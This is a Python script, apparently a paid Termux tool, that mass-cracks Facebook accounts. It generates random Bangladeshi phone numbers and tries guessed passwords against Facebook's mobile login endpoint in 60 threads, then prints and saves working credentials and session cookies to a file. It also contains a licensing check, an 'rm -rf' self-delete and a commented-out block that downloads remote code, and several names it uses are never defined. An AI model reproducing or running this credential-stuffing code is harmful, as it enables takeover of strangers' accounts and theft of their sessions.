
import os,sys,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re
from uuid import uuid4
from time import sleep as sp
#_________[ INSTALLING REQUESTS ]_____
'''
http_directory = tempfile.mkdtemp(prefix='.')
req = "/data/data/com.termux/files/usr/lib/python3.11/site-packages/"
site_packages = sys.path[4]
sys.path.remove(site_packages)
sys.path.insert(4,http_directory+'/reqmodule')
find_aarch = subprocess.check_output('uname -om',shell=True)

if "aarch64" in str(find_aarch):
	user_aarch = "64"
	link = "https://github.com/dcofficial/dilute_modules/releases/download/modules/config64.zip"

elif "arm" in str(find_aarch):
	user_aarch = "32"
	link = "https://github.com/dcofficial/dilute_modules/releases/download/modules/config32.zip"
else:
	print(" [•] Your Device aarch Unknown ")


try:
	os.system(f"curl -L {link} > {http_directory}/config.zip")
	os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')
	os.chdir(f"{http_directory}/reqmodule")
except Exception as e:
	print(e)
except ConnectionError:
	print(" [•] Please Check Your Internet ")
'''

try:
	import requests
except ModuleNotFoundError:
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requestsv')
	#os.system("python UMAR")

try:
	import bs4
	from bs4 import BeautifulSoup as pars
except ModuleNotFoundError:
	os.system('pip install bs4')
except Exception as e:
	print(e)

from concurrent.futures import ThreadPoolExecutor as tpe
import requests
from requests.exceptions import ConnectionError as CE
os.system('xdg-open https://chat.whatsapp.com/LEwEq6tHVjM7wnW33DNfQb')

try:
	key = open(".key.txt","r").read()
except FileNotFoundError:
	key = 'none'

def line():
	print(63*'-')

def p(x):
	print(x)

#___________ [ Lists Used in Script]________

id = []
ok = []
cp = []
loop = 0
method=[]
SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
ses = requests.Session()
def logo():
	os.system('clear')
	logo = ("""\33[;33m   
         
\033[92m
  ______             __                           
 /      \           /  |                          
/$$$$$$  | __    __ $$ |____    ______    ______  
$$ |  $$/ /  |  /  |$$      \  /      \  /      \ 
$$ |      $$ |  $$ |$$$$$$$  |/$$$$$$  |/$$$$$$  |
$$ |   __ $$ |  $$ |$$ |  $$ |$$    $$ |$$ |  $$/ 
$$ \__/  |$$ \__$$ |$$ |__$$ |$$$$$$$$/ $$ |      
$$    $$/ $$    $$ |$$    $$/ $$       |$$ |      
 $$$$$$/   $$$$$$$ |$$$$$$$/   $$$$$$$/ $$/       
          /  \__$$ |                              
          $$    $$/                               
           $$$$$$/                                

[<>] The Original Codes are Written by Umar Nazeer 
---------------------------------------------------
 ╰◈▪➣ Github    : https://github.com/CyberAttack 
 ╰◈▪➣ Facebook  : https://www.facebook.com/InnocentUmarr
 ╰◈▪➣ Author    : ★彡[ᴜᴍᴀʀ ɴᴀᴢᴇᴇʀ]彡★ 
 ╰◈▪➣ Version   : DC Extreme [2.2]
 ╰◈▪➣   \033[1;96m★彡[ɪᴍʀᴀɴ ᴋʜᴀɴ ʟᴏᴠᴇʀ]彡★\033[1;97m
-------------------------------------------------- 
\033[1;97m""")  
	p(logo)
def clear():
	os.system("clear")


uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""

bumper = f'{id}{xp}'

def connection_token():
	 digits_count = 16
	 letters_count = 16
	 letters = ''.join((random.choice(string.ascii_letters) for i in range(letters_count)))
	 digits = ''.join((random.choice(string.digits) for i in range(digits_count)))

	 # Convert resultant string to list and shuffle it to mix letters and digits
	 sample_list = list(letters + digits)
	 random.shuffle(sample_list)
	 # convert list to string
	 final_string = ''.join(sample_list)
	 return final_string

def update():
	logo()
	print(' [•] Checking Updates from Our Server ....')
	line()
	try:
		server = pars(requests.get('https://dilutecodes.blogspot.com/2023/05/iamabestserver.html?m=1',verify=True).text,'html.parser')
	except CE:
		print(" [•] Check Your Internet")
	for x in server.find_all('div',class_='post-body entry-content float-container'):
		r = x.text

	if '2.0.1' in r:
		print(' [•] Server is Online Welcome Users ..')
		sp(1)
		print(" [•] Tool is Updated On 24/5/2023")
		print(" [•] Checking Subscription ")
		iAmApprovelSystem()
	elif "off" in r:
		print(' [•] Server is Offline For Some Reasons ..')
		exit()
	else:
		print(' [•] A new Version of this Dilute Tool is Available | Please Wait ....')
		print(" [•] Updating Tool ....")
		line()
		sp(1)
		


def iAmApprovelSystem():
	try:
		r = pars(requests.get("https://aqibservers.blogspot.com/2023/05/iamjohnnysins.html?m=1",verify=True).text,'html.parser')
	except CE:
		print(" [•] Check Your Internet Connection ...")
	except Exception as e:
		print(e)
	for x in r.find_all('div',class_="post-body entry-content float-container"):
		server_keys = x.text
	if 'free' in str(server_keys):
		print(" [•] Tool is on Free Trial Enjoy")
		sp(2)
		iAmMain().iAmMenu()
	elif 'update' in str(server_keys):
		print(" [•] Tool is Under Maintenence ")
		exit()
	elif str(bumper) in server_keys:
		if str(bumper)+'|ok' in server_keys:
			status = 'ok'
			iAmMain().iAmMenu()
	elif str(bumper) in server_keys:
		if str(bumper)+'|expired' in server_keys:
			buy()
	elif str(bumper) in server_keys:
		if str(bumper)+'|fuck' in server_keys:
			status = 'fuck'
			print(" [•] You Dont Have Permission To use this Tool ..")
			os.system("rm -rf d64 d32 Cyber")
			exit()
	elif str(key) in server_keys:
		if str(key)+'|ok' in server_keys:
			iAmMain().iAmMenu()
	else:
		buy()

def buy():
	logo()
	line()
	print(" [•] Terms and Conditions Please Read Carefully ")
	print(" [•] Your Token is Not Approved ")
	print(" [•] This Tool is paid you need to buy first before Use ! ")
	print(" [•] 1 token is only for 1 device you can't use your subscription in more than 1 device")
	print(" [•] please do agree terms and conditions then buy")
	line()
	print(' [•] If Facebook go on update and you dont get any accounts its your headache ')
	print(' [•] Apni zimaydari pe buy kren,me koi b zimaydari n leta illegal atctivity k')
	print(" [•] 300 / 1Month , 250 / 15 Days ")
	print(" [•] Payment : JazzCash/Easypaisa")
	print(' [•] Account Num : 03152056613 ')
	print(" [•] Token : %s"%(bumper))
	print(" [•] Copy & send Token to Admun to get approved ")
	print(" [•] Koi mera dost ho ya kuch b ho ab free approvel me kise ko nhi donga ids ay ya nah ay apni zimaydari pe buy kro ")
	line()
	exit()
		
def virusA():
	user=[]
	os.system('clear')
	print(logo)
	print(" ┏━[•] BD SIM CODE 017 018 019 013 015 016]")
	kode = input(' ┗━[+] SELECT : ')
	doamin = ' BD Number id cloner [ONLY-OK] '
	print(' ┏━[•] EXAMPLE : 1000,5000,10000,15000,20000] ')
	limit = int(input(' ┗━[+] LIMIT : '))
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=60) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('┏━[•] COUNTRY    : Bangladesh')
		print('┣━[•] TOTAL ID   :  '+tl)
		print(f'┣━[•] SIM CODE   : \033[1;92m {kode} ')
		print('\033[1;97m┗━[•] \033[1;92mSTART BD NAMBER MIXT CRACKING... ')
		print(50*'━')
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you']
			yaari.submit(b,uid,pwx,tl)
	print(50*'_')
	print(' [💉] Crack process has been completed')
	print(' [💉] Ids saved in ok.txt,cp.txt')
	print(50*'_')
	exit()

def b(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m[HRIDOYE]\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'p.facebook.com',
    'method': 'GET', 
	'scheme': 'https', 
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Infinix X665B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,
    'viewport-width': '980',}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [UMAR-OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/UMAR-ok.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
    except:

        pass
def superuser():
    UMO="Cyber-Attack"
    uuid = str(os.geteuid()) + str(os.getlogin()) 
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/CyberAttack85/Cyber-Attack/blob/main/Aproval.tex").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        os.system("xdg-open https://t.me/bdislamicyber")
        time.sleep(3.0)
        
        os.system("clear")
        print(logo)
        print("\t\033[30m   [\033[1;32m\033[47m First Get Approvel\033[00m\033[1;30m]")
        print ("")
        print("┌━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┐ \n\033[1;32m│ Note : That is Paid because 100% ok id just now login│\033[1;37m\n└━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┘")
        print ("")
        print("                Your Key is Not Approved ")
        print("               Copy And Send Key To Admin")
        print ("")
        print (" Your Key : "+UMO+id)
        print ("\n")
        os.system("espeak \"assalamualaikum ,I am HRIDOYE VAI er  ROBOT and my boss is hridoye.Sir this tool is paid because 100% ok id just now login\"")
        name = input(" Your Name : ")
        os.system(f"espeak \"{name} ,prass Enter to send your key\"")
        print ("")
        input(" Press Enter To Send Key")
        os.system("xdg-open https://www.facebook.com/profile.php?id=100093556008452")
        superuser()        
superuser()

